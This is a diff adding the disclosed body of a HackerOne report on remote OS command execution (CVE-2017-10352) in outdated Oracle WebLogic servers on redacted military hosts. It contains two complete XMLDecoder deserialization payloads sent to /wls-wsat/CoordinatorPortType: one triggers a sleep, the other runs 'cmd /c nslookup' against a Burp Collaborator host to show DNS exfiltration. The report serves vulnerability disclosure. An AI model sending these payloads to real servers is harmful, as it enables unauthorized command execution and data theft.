@@ -8,6 +8,7 @@ tags:
 substate: "resolved"
 weakness: "OS Command Injection"
 enriched: true
+body: true
 date: 2019-10-08
 submitted: 2019-07-03T19:21:18.673Z
 bounty_usd: null
@@ -25,6 +26,83 @@ title: "Remote OS command Execution in the 3 more Oracle Weblogic on the ██�
 - Report: [https://hackerone.com/reports/634630](https://hackerone.com/reports/634630)
 - CWE: OS Command Injection | CVE: CVE-2017-10352
 - Submitted: 2019-07-03T19:21:18.673Z
+
+## Report body
+
+Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).
+
+##Description
+Hello. I was able to identify 3 more RCE vulnerabilities due to the outdated Oracle Weblogic instance on the █████████, ███, █████
+After my previous discoveries I decided to dig deeper into the `███.mil` scope/IP space and found other instances of vulnerable Oracle WebLogic. I decided to fill all this additional findings in the single report
+
+##POC
+This request to the https://█████████/wls-wsat/CoordinatorPortType will trigger sleep for 10 seconds (same applies for ████████, ███████):
+
+```
+POST /wls-wsat/CoordinatorPortType HTTP/1.1
+Host: █████████
+Content-Length: 423
+content-type: text/xml
+Accept-Encoding: gzip, deflate, compress
+Accept: */*
+
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+  <soapenv:Header>
+    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+    <java class="java.beans.XMLDecoder">
+        <object class="java.lang.Thread" method="sleep">
+          <long>10000</long>
+        </object>
+      </java>  
+    </work:WorkContext>
+  </soapenv:Header>
+  <soapenv:Body/>
+</soapenv:Envelope>
+```
+
+The next request will resolve custom Burp Collaborator hostname via `nslookup` OS command to prove that it's possible to exfiltrate data via DNS:
+```
+POST /wls-wsat/CoordinatorPortType HTTP/1.1
+Host: ███
+Content-Length: 724
+content-type: text/xml
+Accept-Encoding: gzip, deflate, compress
+Accept: */*
+
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> 
+	<soapenv:Header>
+		<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"> 
+			<java version="1.8.0_151" class="java.beans.XMLDecoder"> 
+			<void class="java.lang.ProcessBuilder"> 
+				<array class="java.lang.String" length="3">
+				<void index = "0">
+					<string>cmd</string>
+				</void>
+				<void index = "1"> 
+					<string>/c</string> 
+				</void>
+				<void index = "2">
+					<string>nslookup j3nxpi8ecz9uznkpu32mb7pj9af13q.burpcollaborator.net</string>
+				</void>
+			</array>
+			<void method="start"/>
+			</void>
+			</java>
+			</work:WorkContext> 
+	</soapenv:Header> 
+<soapenv:Body/>
+</soapenv:Envelope>
+```
+
+
+Note: to reproduce the second case with `nslookup`, `j3nxpi8ecz9uznkpu32mb7pj9af13q.burpcollaborator.net` host should be replaced by your own Burp Collaborator instance to catch the DNS request
+
+##Suggested fix
+Patching WebLogic to the resent version will fix the issue.
+
+## Impact
+
+Remote OS command execution.
 
 ## Timeline
 
